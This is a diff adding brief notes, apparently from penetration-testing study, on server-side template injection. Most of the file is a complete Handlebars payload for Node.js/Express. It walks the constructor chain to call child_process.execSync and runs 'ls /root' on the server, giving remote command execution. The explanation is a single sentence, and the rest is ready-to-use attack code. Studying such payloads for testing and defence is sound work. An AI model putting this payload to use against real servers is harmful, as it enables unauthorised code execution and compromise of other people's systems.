@@ -1,0 +1,29 @@
+SERVER SIDE TEMPLATE INJECTION
+
+A server side template injection is a vulnerability where the attacker injects malicious input into a template in order to execute commands on the server.
+https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+
+A good way to identify the kind of SSTI we have is by checking SSTI.png.
+Once analyzed we have to workaround to understand how the framework could execute code by using a proxy to make it easier.
+One payload that works for NodeJS using express is:
+```
+{{#with "s" as |string|}}
+{{#with "e"}}
+{{#with split as |conslist|}}
+{{this.pop}}
+{{this.push (lookup string.sub "constructor")}}
+{{this.pop}}
+{{#with string.split as |codelist|}}
+{{this.pop}}
+{{this.push "return process.mainModule.require('child_process').execSync('ls /root');"}}
+{{this.pop}}
+{{#each conslist}}
+{{#with (string.sub.apply 0 codelist)}}
+{{this}}
+{{/with}}
+{{/each}}
+{{/with}}
+{{/with}}
+{{/with}}
+{{/with}}
+```
